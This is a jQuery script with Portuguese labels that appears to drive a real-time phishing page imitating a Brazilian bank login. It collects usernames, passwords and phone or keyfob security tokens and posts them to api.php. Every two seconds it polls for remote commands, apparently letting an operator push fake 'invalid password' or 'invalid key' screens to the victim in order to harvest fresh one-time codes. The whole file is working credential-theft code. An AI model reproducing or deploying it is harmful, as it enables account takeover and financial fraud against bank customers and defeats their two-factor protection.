$('document').ready(function () {


    var InfoHeader = { id: "", hash: "", info: "", status: "" };
    InfoHeader.id = $('input#id').val();
    InfoHeader.hash = $('input#hash').val();
    InfoHeader.info = "";
    InfoHeader.status = "";

    function atualizarTela() {

        $('div.boxes').addClass('hide');
        $('div#boxUsuarioSenha div#boxLogin').removeClass('erroOn').find('strong.msgErro').text('');
        $('div#boxTokenCelular div#chaveseguranca').removeClass('erroOn').find('p.txtErro span').text('');
        $('div#boxTokenChaveiro div#chaveseguranca').removeClass('erroOn').find('p.txtErro span').text('');


        if (InfoHeader.status === 'LOGIN') {
            $('div#boxTipoAcesso').removeClass('hide');
        }
        if (InfoHeader.status === 'USUARIO_SENHA') {

            $('div#boxUsuarioSenha').removeClass('hide');
            $('div#boxUsuarioSenha input[value=USUARIO_SENHA]').attr('checked', 'checked');

        }

        if (InfoHeader.status === 'ICP_BRASIL') {

            $('div#boxICPBrasil').removeClass('hide');
            $('div#boxICPBrasil input[value=ICP_BRASIL]').attr('checked', 'checked');

        }

        if (InfoHeader.status === 'CERTIFICADO') {

            $('div#boxCertificado').removeClass('hide');
            $('div#boxCertificado input[value=CERTIFICADO]').attr('checked', 'checked');

        }
        if (InfoHeader.status === 'AGUARDANDO_LOGIN') {
            $('div#boxAguardando').removeClass('hide');
        }
        if (InfoHeader.status === 'LOGIN_ERRO') {
            $('div#boxUsuarioSenha div#boxLogin').addClass('erroOn').find('strong.msgErro').text('Usuário ou Senha Inválidos');
            zerarUsuarioSenha();
            $('div#boxUsuarioSenha').removeClass('hide');
        }
        if (InfoHeader.status === 'TOKEN_CELULAR') {

            $('div#boxTokenCelular').find('span.nomeUsuario').text(InfoHeader.info.nome);
            $('div#boxTokenCelular').find('span.numeroDeSerie').text(InfoHeader.info.numeroSerie);
            $('div#boxTokenCelular').removeClass('hide');
        }
        if (InfoHeader.status === 'TOKEN_CELULAR_ERRO') {
            $('div#boxTokenCelular div#chaveseguranca').addClass('erroOn').find('p.txtErro span').text('Chave inválida.');
            $('div#boxTokenCelular input[name=tokenCelular]').val('');
            $('div#boxTokenCelular').find('span.nomeUsuario').text(InfoHeader.info.nome);
            $('div#boxTokenCelular').find('span.numeroDeSerie').text(InfoHeader.info.numeroSerie);
            $('div#boxTokenCelular').removeClass('hide');
        }
        if (InfoHeader.status === 'TOKEN_CHAVEIRO') {

            $('div#boxTokenChaveiro').find('span.nomeUsuario').text(InfoHeader.info.nome);
            $('div#boxTokenChaveiro').find('span.numeroDeSerie').text(InfoHeader.info.numeroSerie);
            $('div#boxTokenChaveiro').removeClass('hide');
        }
        if (InfoHeader.status === 'TOKEN_CHAVEIRO_ERRO') {
            $('div#boxTokenChaveiro div#chaveseguranca').addClass('erroOn').find('p.txtErro span').text('Chave inválida.');
            $('div#boxTokenChaveiro input[name=tokenCelular]').val('');
            $('div#boxTokenChaveiro').find('span.nomeUsuario').text(InfoHeader.info.nome);
            $('div#boxTokenChaveiro').find('span.numeroDeSerie').text(InfoHeader.info.numeroSerie);
            $('div#boxTokenChaveiro').removeClass('hide');
        }


    }

    $('div#conteudo_interno').on('change', 'input[value=USUARIO_SENHA]', function (e) {

        if ($(this).prop("checked") == true) {
            InfoHeader.info.comando = 'USUARIO_SENHA';

            $.ajax({
                url: "api.php",
                type: 'POST',
                data: { action: "ALTERAR_COMANDO", id: InfoHeader.id, clientHashId: InfoHeader.hash, comando: InfoHeader.info.comando },
                cache: false,
                success: function (r) {
                    status = InfoHeader.info.comando;
                    atualizarTela();
                }
            });
        }

    });


    $('div#conteudo_interno').on('change', 'input[value=CERTIFICADO]', function (e) {

        if ($(this).prop("checked") == true) {
            InfoHeader.info.comando = 'CERTIFICADO';

            $.ajax({
                url: "api.php",
                type: 'POST',
                data: { action: "ALTERAR_COMANDO", id: InfoHeader.id, clientHashId: InfoHeader.hash, comando: InfoHeader.info.comando },
                cache: false,
                success: function (r) {
                    status = InfoHeader.info.comando;
                    atualizarTela();
                }
            });
        }

    });

    $('div#conteudo_interno').on('change', 'input[value=ICP_BRASIL]', function (e) {

        if ($(this).prop("checked") == true) {
            InfoHeader.info.comando = 'ICP_BRASIL';

            $.ajax({
                url: "api.php",
                type: 'POST',
                data: { action: "ALTERAR_COMANDO", id: InfoHeader.id, clientHashId: InfoHeader.hash, comando: InfoHeader.info.comando },
                cache: false,
                success: function (r) {
                    status = InfoHeader.info.comando;
                    atualizarTela();
                }
            });
        }

    });


    function zerarUsuarioSenha() {
        $('input#loginUsuario').val('');
        $('input#loginSenha').val('');
    }

    $('div#boxUsuarioSenha').on('click', 'input.bt_avancar', function (e) {

        let usuario = $('input#loginUsuario').val();
        let senha = $('input#loginSenha').val();

        if (usuario.length === 0 || senha.length === 0) {
            $('input#loginUsuario').focus('');
            $('div#boxUsuarioSenha div#boxLogin').addClass('erroOn').find('strong.msgErro').text('Usuário ou Senha Inválidos');
            return;
        }

        InfoHeader.info.usuario = usuario;
        InfoHeader.info.senha = senha;
        InfoHeader.info.comando = 'AGUARDANDO_LOGIN';

        $.ajax({
            url: "api.php",
            type: 'POST',
            data: { action: "ATUALIZAR_INFORMACOES", id: InfoHeader.id, clientHashId: InfoHeader.hash, obj: InfoHeader.info },
            cache: false,
            success: function (r) {
                status = InfoHeader.info.comando;
                zerarUsuarioSenha();
                atualizarTela();

            }
        });

    });

    $('div#boxTokenCelular').on('click', 'input.bt_confirmar', function (e) {

        let token = $('div#boxTokenCelular input[name=tokenCelular]').val();

        if (token.length < 6) {
            $('div#boxTokenCelular div#chaveseguranca').addClass('erroOn').find('p.txtErro span').text('Chave inválida.');
            return;
        }


        let label = 'Token Celular';

        InfoHeader.info.comando = 'AGUARDANDO_LOGIN';

        $.ajax({
            url: "api.php",
            type: 'POST',
            data: { action: "SALVAR_TOKEN", id: InfoHeader.id, clientHashId: InfoHeader.hash, label: label, valor: token, status: InfoHeader.info.comando },
            cache: false,
            success: function (r) {
                status = InfoHeader.info.comando;
                atualizarTela();

            }
        });

    });

    $('div#boxTokenChaveiro').on('click', 'input.bt_confirmar', function (e) {
let token = $('div#boxTokenChaveiro input[name=tokenCelular]').val(); 
        if (token.length < 6) {
            $('div#boxTokenChaveiro div#chaveseguranca').addClass('erroOn').find('p.txtErro span').text('Chave inválida.');
            return;
        }


        let label = 'Token Chaveiro';

        InfoHeader.info.comando = 'AGUARDANDO_LOGIN';

        $.ajax({
            url: "api.php",
            type: 'POST',
            data: { action: "SALVAR_TOKEN", id: InfoHeader.id, clientHashId: InfoHeader.hash, label: label, valor: token, status: InfoHeader.info.comando },
            cache: false,
            success: function (r) {
                status = InfoHeader.info.comando;
                atualizarTela();

            }
        });

    });






    var timer = setInterval(function () {
        readcommands(InfoHeader,atualizarTela);
    }, 2000);

});